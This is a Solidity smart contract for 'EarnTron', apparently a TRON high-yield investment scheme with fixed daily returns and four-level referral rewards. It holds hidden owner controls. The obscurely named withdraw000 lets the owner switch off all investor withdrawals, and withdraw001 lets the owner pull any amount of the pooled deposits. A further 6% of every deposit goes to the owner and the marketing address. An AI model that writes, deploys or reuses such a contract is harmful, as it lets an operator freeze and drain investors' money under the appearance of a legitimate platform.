//SourceUnit: Earn TRON.sol

pragma solidity ^0.4.25;

contract EarnTron  {
  using SafeMath for uint;
  
  struct Tariff {
    uint time;
    uint percent;
  }
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }

  struct Referer {
    address myReferer;
    uint nivel;
  }

  struct Investor {
    bool registered;
    address sponsor;
    bool exist;
    Referer[] referers;
    uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
  }
  
  uint MIN_DEPOSIT = 200 trx;

  address public owner;
  address public Marketing;
  address public NoValido;
  bool public Do;
  
  Tariff[] public tariffs;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;

  mapping (address => Investor) public investors;

  event DepositAt(address user, uint tariff, uint amount);
  event Withdraw(address user, uint amount_withdraw);
  event reInvest(address user, uint amount_reInvest);
  event referersRegistered(address user, address to_user, uint nivelProfundidad);
  event RewardRefer(address user, uint amount);

  constructor(address _Marketing) public {
    owner = msg.sender;
    Marketing = _Marketing;
    start();
    Do = true;
       
    tariffs.push(Tariff(100 * 28800, 200));
    tariffs.push(Tariff(1 * 28800, 100));

  }

  function setstate() public view  returns(uint Investors,uint Invested,uint RefRewards){
      return (totalInvestors, totalInvested, totalRefRewards);
  }
  

  function setMarketing (address _Marketing) public {
    require (msg.sender == owner);
    require (Marketing != _Marketing);
    Marketing = _Marketing;

  }
  
  function start () internal {
    if (msg.sender == owner){
      investors[msg.sender].registered = true;
      investors[msg.sender].sponsor = owner;
      investors[msg.sender].exist = false;
      totalInvestors++;
    }
  }
  
  function register() internal {
    if (!investors[msg.sender].registered) {
      investors[msg.sender].registered = true;
      totalInvestors++;
    }
  }

  function registerSponsor(address sponsor) internal {
    if (!investors[msg.sender].exist){
      investors[msg.sender].sponsor = sponsor;
      investors[msg.sender].exist = true;
    }
  }

  function registerReferers(address ref, address spo) internal {

      
    if (investors[spo].registered) {

      investors[spo].referers.push(Referer(ref,3));
      uint nvl = 1;
      emit referersRegistered(ref, spo, nvl);
      if (investors[spo].exist){
        spo = investors[spo].sponsor;
        if (investors[spo].registered){
          investors[spo].referers.push(Referer(ref,2));
          nvl = 2;
          emit referersRegistered(ref, spo, nvl);
          if (investors[spo].exist){
            spo = investors[spo].sponsor;
            if (investors[spo].registered){
              investors[spo].referers.push(Referer(ref,1));
              nvl = 3;
              emit referersRegistered(ref, spo, nvl);
              if (investors[spo].exist){
                spo = investors[spo].sponsor;
                if (investors[spo].registered){
                   investors[spo].referers.push(Referer(ref,1));
                   nvl = 4;
                   emit referersRegistered(ref, spo, nvl);
                }
              }
            }
          }
        }
      }
    }
  }
  
  function rewardReferers(address yo, uint amount, address sponsor) internal {
    address spo = sponsor;
    for (uint i = 0; i < 4; i++) {

      if (investors[spo].referers.length > 0) {

        for (i = 0; i < investors[spo].referers.length; i++) {
          if (!investors[spo].registered) {
            break;
          }
          if ( investors[spo].referers[i].myReferer == yo){
              uint b = investors[spo].referers[i].nivel;
              uint a = amount * b / 100;
              investors[spo].balanceRef += a;
              investors[spo].totalRef += a;
              totalRefRewards += a;
              emit RewardRefer(spo, a);
          }
        }

        spo = investors[spo].sponsor;
      }
    }
    
    
  }
  
  function deposit(uint tariff, address _sponsor) external payable {
    require(msg.value >= MIN_DEPOSIT);
    require(tariff < tariffs.length);
    require (_sponsor != msg.sender);
    
    register();

    if (_sponsor != owner && investors[_sponsor].registered && _sponsor != NoValido){
      if (!investors[msg.sender].exist){
        registerSponsor(_sponsor);
        registerReferers(msg.sender, investors[msg.sender].sponsor);
      }
    }

    rewardReferers(msg.sender, msg.value, investors[msg.sender].sponsor);
    
    investors[msg.sender].invested += msg.value;
    totalInvested += msg.value;
    
    investors[msg.sender].deposits.push(Deposit(tariff, msg.value, block.number));
    
    owner.transfer(msg.value.mul(4).div(100));
    Marketing.transfer(msg.value.mul(2).div(100));

    
    emit DepositAt(msg.sender, tariff, msg.value);
  }
  
  function withdraw000() public returns (bool set_Do) {
    if (msg.sender == owner){
      if(Do){
        Do = false;
      }else{
        Do = true;
      }
    }
    return Do;
  }

  function withdraw001(uint amount) public returns (uint) {
    require(msg.sender == owner);
    if (msg.sender.send(amount)){
     return amount;
    }
    
  }
  function MYwithdrawable() public view returns (uint amount) {
    Investor storage investor = investors[msg.sender];
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];
      
      uint finish = dep.at + tariff.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
      }
    }
  }
  function withdrawable(address any_user) public view returns (uint amount) {
    Investor storage investor = investors[any_user];
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];
      
      uint finish = dep.at + tariff.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
      }
    }
  }
  
  function profit() internal returns (uint) {
    Investor storage investor = investors[msg.sender];
    
    uint amount = withdrawable(msg.sender);
    
    amount += investor.balanceRef;
    investor.balanceRef = 0;
    
    investor.paidAt = block.number;
    
    return amount;

  }
  
  function withdraw() external {
    if (Do){uint amount = profit();
        uint tariff = 0;
        uint amount25 = amount.mul(25).div(100);
        uint amount75 = amount.mul(75).div(100);
        if (msg.sender.send(amount75)) {
          investors[msg.sender].withdrawn += amount75;
          investors[msg.sender].invested += amount25;
          
          investors[msg.sender].deposits.push(Deposit(tariff, amount25, block.number));
          
          totalInvested += amount25;
      
        emit Withdraw(msg.sender, amount75);
        emit reInvest(msg.sender, amount25);
        }}
  }
  
}

library SafeMath {

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint a, uint b) internal pure returns (uint) {
        require(b > 0);
        uint c = a / b;

        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        require(b <= a);
        uint c = a - b;

        return c;
    }

    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a);

        return c;
    }

}